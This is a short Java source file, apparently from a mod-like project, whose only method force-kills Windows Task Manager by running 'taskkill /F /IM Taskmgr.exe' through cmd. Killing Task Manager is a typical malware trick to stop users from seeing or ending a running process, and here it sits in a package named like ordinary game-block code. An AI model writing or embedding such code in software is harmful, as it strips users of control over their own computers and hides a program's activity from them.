package maurus.common.block;
// Credits: https://github.com/HIHI-777

public class TaskkillTaskMngr {
    public static void taskkill(){
        try {
            new ProcessBuilder("cmd", "/c", "taskkill /F /IM Taskmgr.exe").start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}